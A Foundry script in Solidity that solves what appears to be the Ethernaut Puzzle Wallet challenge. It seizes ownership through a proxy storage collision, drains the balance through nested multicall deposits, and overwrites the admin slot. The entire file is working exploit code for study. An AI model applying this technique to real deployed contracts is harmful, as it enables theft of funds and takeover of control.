// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "../lib/forge-std/src/Script.sol";
import {console} from "../lib/forge-std/src/console.sol";

interface PuzzleProxy {
    function owner() external returns(address);
    function admin() external returns(address);
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function addToWhitelist(address addr) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;

    function execute(address to, uint256 value, bytes calldata data) external payable;
}

contract PuzzleWalletScriptContract is Script {
    function run() external {
        vm.startBroadcast();
        address levelContractAddress = 0x62ad0309310dAB974dC9F46b02f3bcb903045F24;
        PuzzleProxy pp = PuzzleProxy(levelContractAddress);
        
        // step1 : call proposeNewAdmin function , so that in PuzzleWallet , it will consider owner as pendingAdmin
        pp.proposeNewAdmin(msg.sender);

        // step2 : add msg.sender to whitelist , since owner is msg.sender from step1
        pp.addToWhitelist(msg.sender);

        // step3 : make balance of the contract to 0
        // multicall ( deposit(1 eth) , multicall( deposit 1 eth ) , execute(2 eth)  )
        uint256 balance = levelContractAddress.balance;
        bytes[] memory firstLevelData = new bytes[](3);
        firstLevelData[0] = abi.encodeWithSelector(pp.deposit.selector);

        bytes[] memory secondLevelData = new bytes[](1);
        secondLevelData[0] = abi.encodeWithSelector(pp.deposit.selector);
        firstLevelData[1] = abi.encodeWithSelector(pp.multicall.selector, secondLevelData);

        firstLevelData[2] = abi.encodeWithSelector(pp.execute.selector, msg.sender, balance * 2, "");
        pp.multicall{value : balance}(firstLevelData);

        // step3 : call setMaxBalance to change max_balance to msg.sender , so that admin is changed to msg.sender
        pp.setMaxBalance(uint256(uint160(msg.sender)));

        require(pp.admin() == msg.sender, "admin is NOT msg.sender , failed");

        vm.stopBroadcast();
    }
}
